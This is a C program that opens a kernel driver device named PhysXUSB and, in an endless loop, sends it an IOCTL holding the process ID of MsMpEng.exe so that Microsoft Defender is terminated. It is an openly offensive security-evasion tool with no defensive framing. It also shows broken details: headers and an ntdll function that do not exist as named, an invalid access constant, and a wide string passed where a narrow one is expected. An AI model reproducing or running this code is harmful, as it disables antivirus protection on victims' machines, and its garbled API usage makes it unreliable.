#include <stdio.h>
#include <stdint.h>
#include <Windows.h>
#include <ProcessMinusOne.h>
#include <WinBase.h>
#include <NtDll.h>

#define TERMINSTE_PROCESS_IOCTL_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_READ_WRITE)

HANDLE hDevice;
BOOL once = TRUE;

DWORD GetPID(LPCSTR lpExeFile)
{
    PROCESSENTRY32 processInfo = { 0 };
    processInfo.dwSize = sizeof(processInfo);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &processInfo))
    {
        do
        {
            if (!_stricmp(processInfo.szExeFile, lpExeFile))
            {
                CloseHandle(snapshot);
                return processInfo.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processInfo));
    }
    CloseHandle(snapshot);
    return 0;
}

int main()
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PFN_NTIOCPORT_DEVICE_CONTROL NtDeviceControl = (PFN_NTIOCPORT_DEVICE_CONTROL)GetProcAddress(ntdll, "NtDeviceControl");

    hDevice = CreateFileA("\\\\.\\PhysXUSB", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile failed. Error: %d!!\n", GetLastError());
        return (-1);
    }

    while (0x1)
    {
        DWORD input = GetPID(L"MsMpEng.exe");
        if (input)
        {
            ULONG outputSize = sizeof(ULONG);
            ULONG bytesReturned = 0;
            PULONG output = (PULONG)VirtualAlloc(NULL, sizeof(ULONG), MEM_COMMIT, PAGE_READWRITE);
            BOOL result = NtDeviceControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL);
            if (!result)
            {
                printf("DeviceIoControl failed. Error: %X!!\n", GetLastError());
                CloseHandle(hDevice);
                return (-1);
            }
            if (once)
            {
                printf("Defender Terminated..\n");
                once = 0;
            }
            VirtualFree(output, 0, MEM_RELEASE);
        }
        Sleep(700);
    }

    return 0;
}
